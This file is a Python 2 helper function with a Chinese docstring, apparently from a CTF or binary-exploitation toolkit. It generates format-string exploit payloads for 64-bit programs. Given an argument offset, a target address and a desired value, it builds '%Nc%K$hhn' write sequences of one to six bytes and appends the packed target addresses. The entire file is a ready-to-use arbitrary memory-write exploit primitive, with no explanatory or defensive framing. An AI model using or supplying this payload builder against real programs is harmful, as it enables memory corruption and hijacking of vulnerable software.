def format_string_template_64(location_arg,target,after_change,len_other_string = 0,ljust_location = 0x50,bit = 0x6):

    '''
    第一个参数是格式化字符串的位置，即第几个参数
    第二个参数是要改哪里的值
    第三个参数是把想把目标值改成什么值
    第四个参数是看看在printf之前还有没有奇奇怪怪的字符串
    第五个参数是ljust填补核心payload之后，让其0x8个字节对齐，默认是0x50
    第六个参数是要覆盖的位数，默认为6
    '''
    if bit == 1:
        low1 = (after_change & 0xff)

        c1 = (low1 - len_other_string + 0x100) % 0x100

        location_arg1 = location_arg + ljust_location / 0x8
        payload = '%' + str(c1) + 'c' + '%' + str(location_arg1) + 'hhn'
        payload = payload.ljust(ljust_location,'a')

        payload = payload + p64(target)

    if bit == 2:
        low1 = (after_change & 0xff)
        low2 = (after_change & 0xff00) >> 8

        c1 = (low1 - len_other_string + 0x100) % 0x100
        c2 = (low2 - low1 + 0x100) % 0x100

        location_arg1 = location_arg + ljust_location / 0x8
        location_arg2 = location_arg1 + 1

        payload = '%' + str(c1) + 'c' + '%' + str(location_arg1) + 'hhn'
        payload = payload + '%' + str(c2) + 'c' + '%' + str(location_arg2) + 'hhn'
        payload = payload.ljust(ljust_location,'a')

        payload = payload + p64(target)
        payload = payload + p64(target + 0x1)

    if bit == 3:
        low1 = (after_change & 0xff)
        low2 = (after_change & 0xff00) >> 8
        low3 = (after_change & 0xff0000) >> 16
    
        c1 = (low1 - len_other_string + 0x100) % 0x100
        c2 = (low2 - low1 + 0x100) % 0x100
        c3 = (low3 - low2 + 0x100) % 0x100
    
        location_arg1 = location_arg + ljust_location / 0x8
        location_arg2 = location_arg1 + 1
        location_arg3 = location_arg2 + 1
    
        payload = '%' + str(c1) + 'c' + '%' + str(location_arg1) + 'hhn'
        payload = payload + '%' + str(c2) + 'c' + '%' + str(location_arg2) + 'hhn'
        payload = payload + '%' + str(c3) + 'c' + '%' + str(location_arg3) + 'hhn'
        payload = payload.ljust(ljust_location,'a')
    
        payload = payload + p64(target)
        payload = payload + p64(target + 0x1)
        payload = payload + p64(target + 0x2)

    if bit == 4:
        low1 = (after_change & 0xff)
        low2 = (after_change & 0xff00) >> 8
        low3 = (after_change & 0xff0000) >> 16
        low4 = (after_change & 0xff000000) >> 24
    
        c1 = (low1 - len_other_string + 0x100) % 0x100
        c2 = (low2 - low1 + 0x100) % 0x100
        c3 = (low3 - low2 + 0x100) % 0x100
        c4 = (low4 - low3 + 0x100) % 0x100
    
        location_arg1 = location_arg + ljust_location / 0x8
        location_arg2 = location_arg1 + 1
        location_arg3 = location_arg2 + 1
        location_arg4 = location_arg3 + 1
    
        payload = '%' + str(c1) + 'c' + '%' + str(location_arg1) + 'hhn'
        payload = payload + '%' + str(c2) + 'c' + '%' + str(location_arg2) + 'hhn'
        payload = payload + '%' + str(c3) + 'c' + '%' + str(location_arg3) + 'hhn'
        payload = payload + '%' + str(c4) + 'c' + '%' + str(location_arg4) + 'hhn'
        payload = payload.ljust(ljust_location,'a')
    
        payload = payload + p64(target)
        payload = payload + p64(target + 0x1)
        payload = payload + p64(target + 0x2)
        payload = payload + p64(target + 0x3)

    if bit == 5:
        low1 = (after_change & 0xff)
        low2 = (after_change & 0xff00) >> 8
        low3 = (after_change & 0xff0000) >> 16
        low4 = (after_change & 0xff000000) >> 24
        low5 = (after_change & 0xff00000000) >> 32
    
        c1 = (low1 - len_other_string + 0x100) % 0x100
        c2 = (low2 - low1 + 0x100) % 0x100
        c3 = (low3 - low2 + 0x100) % 0x100
        c4 = (low4 - low3 + 0x100) % 0x100
        c5 = (low5 - low4 + 0x100) % 0x100
    
        location_arg1 = location_arg + ljust_location / 0x8
        location_arg2 = location_arg1 + 1
        location_arg3 = location_arg2 + 1
        location_arg4 = location_arg3 + 1
        location_arg5 = location_arg4 + 1
    
        payload = '%' + str(c1) + 'c' + '%' + str(location_arg1) + 'hhn'
        payload = payload + '%' + str(c2) + 'c' + '%' + str(location_arg2) + 'hhn'
        payload = payload + '%' + str(c3) + 'c' + '%' + str(location_arg3) + 'hhn'
        payload = payload + '%' + str(c4) + 'c' + '%' + str(location_arg4) + 'hhn'
        payload = payload + '%' + str(c5) + 'c' + '%' + str(location_arg5) + 'hhn'
        payload = payload.ljust(ljust_location,'a')
    
        payload = payload + p64(target)
        payload = payload + p64(target + 0x1)
        payload = payload + p64(target + 0x2)
        payload = payload + p64(target + 0x3)
        payload = payload + p64(target + 0x4)

    if bit == 6:
        low1 = (after_change & 0xff)
        low2 = (after_change & 0xff00) >> 8
        low3 = (after_change & 0xff0000) >> 16
        low4 = (after_change & 0xff000000) >> 24
        low5 = (after_change & 0xff00000000) >> 32
        low6 = (after_change & 0xff0000000000) >> 40
    
        c1 = (low1 - len_other_string + 0x100) % 0x100
        c2 = (low2 - low1 + 0x100) % 0x100
        c3 = (low3 - low2 + 0x100) % 0x100
        c4 = (low4 - low3 + 0x100) % 0x100
        c5 = (low5 - low4 + 0x100) % 0x100
        c6 = (low6 - low5 + 0x100) % 0x100
    
        location_arg1 = location_arg + ljust_location / 0x8
        location_arg2 = location_arg1 + 1
        location_arg3 = location_arg2 + 1
        location_arg4 = location_arg3 + 1
        location_arg5 = location_arg4 + 1
        location_arg6 = location_arg5 + 1
    
        payload = '%' + str(c1) + 'c' + '%' + str(location_arg1) + 'hhn'
        payload = payload + '%' + str(c2) + 'c' + '%' + str(location_arg2) + 'hhn'
        payload = payload + '%' + str(c3) + 'c' + '%' + str(location_arg3) + 'hhn'
        payload = payload + '%' + str(c4) + 'c' + '%' + str(location_arg4) + 'hhn'
        payload = payload + '%' + str(c5) + 'c' + '%' + str(location_arg5) + 'hhn'
        payload = payload + '%' + str(c6) + 'c' + '%' + str(location_arg6) + 'hhn'
        payload = payload.ljust(ljust_location,'a')
    
        payload = payload + p64(target)
        payload = payload + p64(target + 0x1)
        payload = payload + p64(target + 0x2)
        payload = payload + p64(target + 0x3)
        payload = payload + p64(target + 0x4)
        payload = payload + p64(target + 0x5)

    return payload